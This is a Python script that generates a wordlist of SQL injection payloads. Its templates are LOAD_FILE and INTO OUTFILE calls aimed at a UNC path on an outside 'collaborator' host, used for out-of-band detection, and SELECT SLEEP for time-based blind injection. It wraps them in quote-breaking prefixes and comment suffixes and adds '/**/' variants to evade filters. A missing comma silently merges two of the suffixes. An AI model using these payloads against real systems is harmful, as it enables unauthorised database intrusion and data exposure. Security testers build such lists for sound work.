prefixes = [
    '',
    '; ',
    '" ',
    '") ',
    '")) ',
    '"))) ',
    ') ',
    ')) ',
    '))) '
]

sqlOperators = [
    '',
    'OR ',
    'UNION ',
    'AND '
]

suffixes = [
    '',
    ' -- ',
    '#',
    '/*'
    ' ("',
    ' (("',
    ' ((("',
    ' (',
    ' ((',
    ' ((('
]

templates = [
    'LOAD_FILE("\\\\\\\\{collaborator}\\a")',
    'SELECT "a" INTO OUTFILE "\\\\\\\\{collaborator}\\a"',
    'SELECT SLEEP({time})',
]

# YOU DIDNT TOUCH GENERATE YET!
def generate():
    wordlist = []

    for prefix in prefixes:
        for sqlOperator in sqlOperators:
            for template in templates:
                for suffix in suffixes:
                    word = prefix + sqlOperator + template + suffix
                    wordlist.append(word)
                    wordlist.append(word.replace('"', '\''))
                    word = word.replace(' ', '/**/')
                    wordlist.append(word)
                    wordlist.append(word.replace('"', '\''))

    wordlist = list(set(wordlist))
    return wordlist
